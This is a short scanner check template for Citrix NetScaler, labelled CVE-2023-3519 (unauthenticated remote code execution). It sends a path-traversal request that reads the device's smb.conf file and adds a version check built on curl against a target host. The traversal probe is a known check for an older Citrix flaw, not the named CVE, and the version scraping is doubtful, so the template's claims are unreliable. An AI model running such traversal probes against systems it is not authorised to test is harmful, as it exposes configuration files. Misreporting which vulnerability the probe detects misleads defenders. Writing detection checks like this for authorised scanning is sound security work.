AUTHOR='@xer0dayz'
VULN_NAME='CVE-2023-3519 - Citrix NetScaler ADC & Gateway RCE'
URI="/vpn/../vpns/cfg/smb.conf"
METHOD='GET'
MATCH='\[global\]'
SEVERITY='P1 - CRITICAL'
CURL_OPTS="--user-agent 'Mozilla/5.0' -s --insecure -L -H 'Host: $TARGET'"
SECONDARY_COMMANDS='''
# Check for vulnerable version
VERSION_CHECK=$(curl -s -k -I "https://$TARGET/vpn/theme_list" | grep -i '^Server:' | grep -oP 'Citrix-([0-9]+\.){2}[0-9]+' | cut -d'-' -f2)
if [ -n "$VERSION_CHECK" ]; then
    echo -e "\n[+] Citrix NetScaler Version: $VERSION_CHECK"
    echo "[*] Versions 13.1 < 13.1-49.13, 13.0 < 13.0-91.13, 12.1 < 12.1-65.21 are vulnerable"
fi
'''

# This vulnerability allows unauthenticated remote code execution on affected Citrix NetScaler ADC and Gateway devices
